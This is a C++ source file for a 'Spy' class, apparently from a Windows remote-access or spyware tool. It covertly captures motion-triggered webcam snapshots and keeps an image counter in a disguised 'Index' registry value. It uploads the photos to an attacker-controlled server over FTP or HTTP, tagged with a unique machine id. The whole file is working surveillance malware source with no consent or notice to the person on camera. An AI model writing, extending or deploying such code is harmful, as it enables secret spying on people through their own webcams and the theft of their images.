/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "spy.h"

#include <cstdio>
#include <tchar.h>

#include "xwebcam.h"
#include "ftp.h"
#include "register.h"
#include "print.h"
#include "Icmp.h"
#include "macro.h"
#include "http_helper.h"
#include "info.h"

#include "memory_debug.h"

extern bool RUNNING;

#define MAX_IMG 100

Spy::Spy():m_ftpDirectory(TEXT("")), 
	m_locale(TEXT("\\windows\\temp\\snap.jpg")), 
	m_ftpPassword(0), 
	m_port(21), 
	m_remote(TEXT("snap_")),
	m_url(0), 
	m_ftpUser(0), 
	m_wait(5000),
	m_detail(50),
	m_maxImg(MAX_IMG) {}


void Spy::start(){
	m_start = true;

	XWebcam webcam;
	int webcamCount = webcam.webcamCount();
	if (webcamCount == 0){
		return;
	}

	while(!Icmp::ping("8.8.8.8")){
		MYPRINTF("no internet ? wait\n");
		Sleep(60000);
	}

	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
	TCHAR* key = TEXT("Index");

	Register reg;

	int value = reg.getKeyAsInt(path, key, 0);
	if (value == 0){
		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
		value = 1;
	}
	
	while(m_start) {
		//for (int i = 0; i < webcamCount; i++){
			if (webcam.snapMotionDetection(m_locale.c_str(), 1, m_detail)){
				if (value > m_maxImg){
					value = 1;
				}
				std::tstring name;

				name.append(m_remote);

				TCHAR buffer [33];
				_itot(value, buffer, 10);

				name.append(buffer);
				name.append(TEXT(".jpg"));

				TCHAR buffer2 [33];
				_itot(value, buffer2, 10);

				value++;

				reg.createStringKey(HKEY_CURRENT_USER, path, key, buffer2);

				try {
					Ftp ftp(m_url, 21, m_ftpUser, m_ftpPassword);

					ftp.setCurrentDirectory(TEXT("public_html"));

					//char buffer_dir[128];
					//if (webcamCount != 1){					
					//	sprintf_s(buffer_dir, COUNTOF(buffer_dir), "%s_%d", m_ftpDirectory.c_str(), i + 1);
					//} else {
					//	sprintf_s(buffer_dir, COUNTOF(buffer_dir), "%s", m_ftpDirectory.c_str());
					//}

					try {
						ftp.createDirectory(m_ftpDirectory);
					} catch (std::exception error){
						//MYPRINTF("%s\n", error.what());
					}
					ftp.setCurrentDirectory(m_ftpDirectory);

					ftp.uploadFile(m_locale.c_str(), name.c_str());

				} catch (std::exception error){
					MYPRINTF("exception: %s\n", error.what());
				}
			//}
		}
		Sleep(m_wait);
		m_start = RUNNING;
	}
}

void Spy::startweb(){
	m_start = true;

	XWebcam webcam;
	int webcamCount = webcam.webcamCount();
	if (webcamCount == 0){
		MYPRINTF("no webcam\n");
		return;
	}

	while(!Icmp::ping("8.8.8.8")){
		MYPRINTF("no internet ? wait\n");
		Sleep(60000);
	}

	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
	TCHAR* key = TEXT("Index");

	Register reg;

	int index = reg.getKeyAsInt(path, key, 0);
	if (index == 0){
		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
		index = 1;
	}

	DWORD serialAsInt;
	if (!Info::getUniqueId(serialAsInt)) {
		serialAsInt = 156000;
	}

	while(m_start) {
	//	for (int j = 0; j < 5; j++){
			if (webcam.snapMotionDetection(m_locale.c_str(), 1, m_detail)){
				if (index > m_maxImg){
					index = 1;
				}
				std::tstring remoteName;

				remoteName.append(m_remote);

				TCHAR indexAsStr [33];
				_itot(index, indexAsStr, 10);

				remoteName.append(indexAsStr);
				remoteName.append(TEXT(".jpg"));

				HttpHelper helper;

				char *response = 0;
				int responseSize = 0;

				char newUri[1024];
				sprintf_s(newUri, 1024, "%s?v=1&s=%u", m_url, serialAsInt);

				if (helper.uploadFile(m_server, newUri, (TCHAR *)m_locale.c_str(), (TCHAR *)remoteName.c_str(), &response, responseSize)){
					free(response);
					index++;

					TCHAR newIndexAsStr [33];
					_itot(index, newIndexAsStr, 10);
					reg.createStringKey(HKEY_CURRENT_USER, path, key, newIndexAsStr);
				}				
			//}
		}
		Sleep(m_wait);
		m_start = RUNNING;
	}
}


void Spy::startmemory(){
	m_start = true;

	XWebcam webcam;
	int webcamCount = webcam.webcamCount();
	if (webcamCount == 0){
		MYPRINTF("no webcam\n");
		return;
	}

	while(!Icmp::ping("8.8.8.8")){
		MYPRINTF("no internet ? wait\n");
		Sleep(60000);
	}

	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
	TCHAR* key = TEXT("Index");

	Register reg;

	int index = reg.getKeyAsInt(path, key, 0);
	if (index == 0){
		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
		index = 1;
	}

	DWORD serialAsInt;
	if (!Info::getUniqueId(serialAsInt)) {
		serialAsInt = 156000;
	}
	char *memory;
	DWORD size;
	while(m_start) {
		//for (int j = 0; j < 5; j++){
			if (webcam.snapMotionDetectionToMemory(&memory, size, 1, m_detail)){
				if (index > m_maxImg){
					index = 1;
				}
				std::tstring remoteName;

				remoteName.append(m_remote);

				TCHAR indexAsStr [33];
				_itot(index, indexAsStr, 10);

				remoteName.append(indexAsStr);
				remoteName.append(TEXT(".jpg"));

				HttpHelper helper;

				char *response = 0;
				int responseSize = 0;

				char newUri[1024];
				sprintf_s(newUri, 1024, "%s?v=2&s=%u", m_url, serialAsInt);
				if (helper.uploadBuffer(m_server, newUri, (char *)memory, size, (TCHAR *)remoteName.c_str(), &response, responseSize)){
					free(response);
					index++;

					TCHAR newIndexAsStr [33];
					_itot(index, newIndexAsStr, 10);
					reg.createStringKey(HKEY_CURRENT_USER, path, key, newIndexAsStr);
				}	
				free(memory);
			//}
		}
		Sleep(m_wait);
		m_start = RUNNING;
	}
}